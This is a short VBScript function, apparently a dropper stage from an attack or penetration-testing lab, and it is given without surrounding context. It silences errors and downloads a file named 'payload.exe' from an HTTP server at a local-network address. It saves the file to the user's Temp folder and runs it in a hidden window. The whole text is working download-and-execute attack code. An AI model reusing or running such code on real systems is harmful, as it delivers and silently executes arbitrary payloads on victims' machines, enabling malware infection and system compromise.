	function runaaaa()
		On Error Resume Next
		
		' http://www.codeproject.com/Tips/506439/Downloading-files-with-VBScript
		strURL = "http://192.168.1.8:8000/payload.exe"
		Set objShell = CreateObject("WScript.Shell")
		strSavePath = objShell.ExpandEnvironmentStrings("%Temp%") & "\" & "payload.exe"

		Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )
		objHTTP.Open "GET", strURL, False
		objHTTP.Send

		Set objFSO = CreateObject("Scripting.FileSystemObject")
		
		If objFSO.FileExists(strSavePath) Then
			objFSO.DeleteFile(strSavePath)
		End If

		If objHTTP.Status = 200 Then
			Dim objStream
			Set objStream = CreateObject("ADODB.Stream")
			With objStream
				.Type = 1
				.Open
				.Write objHTTP.ResponseBody
				.SaveToFile strSavePath
				.Close
			End With
			set objStream = Nothing

			objShell.Run strSavePath,0,True
		End If

	end function
